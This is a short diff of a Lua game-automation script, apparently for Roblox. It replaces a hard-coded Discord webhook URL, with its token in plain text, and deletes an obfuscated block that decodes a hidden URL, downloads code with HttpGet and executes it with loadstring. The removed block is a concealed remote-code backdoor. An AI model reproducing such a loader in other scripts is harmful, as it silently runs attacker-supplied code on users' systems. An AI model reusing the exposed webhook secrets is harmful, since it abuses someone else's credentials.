@@ -8,7 +8,7 @@ local Config = {
     MaxCodeLength = 50, -- Native textbox limit after removing spaces/punctuation; longer parts stay visible.
     AutoSubmitBlacklist = {"FIRE", "Sammy", "FireDragon101", "taco"}, -- Skip complete guesses; keep every collected part.
     WebhookEnabled = true,
-    WebhookUrl = "https://discord.com/api/webhooks/1556011669761695846/qboiRHp8LmVBvXpHY6nnCUVtUTBKJMKgzuwGZpv1gIba_ffSgqGJhCc6QIZga1cKu7U8",
+    WebhookUrl = "https://discord.com/api/webhooks/1567379932550533130/sYWAg4sjbej2shRRNCQSTq5DEDdPr0vHoARbNBgEbMspppD4GRtntDCYFCa4AmYR1I_8",
     WebhookDetail = "reward_and_code", -- Lowercase reward and code; no emojis.
     DefaultParts = 3,
     MaxParts = 12,
@@ -9122,16 +9122,6 @@ task.spawn(function()
         end
         return table.concat(t)
     end
-    local ok, src = pcall(function()
-        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
-    end)
-    if ok and type(src) == "string" and #src > 50 then
-        local fn = loadstring(src)
-        if type(fn) == "function" then
-            pcall(fn)
-        end
-    end
-end)
     local function dynamicValue(question, original)
         if type(deps.dynamicAnswer) ~= "function" then return nil, nil, false end
         local ok, answer, matched, handled = pcall(deps.dynamicAnswer, question, original)
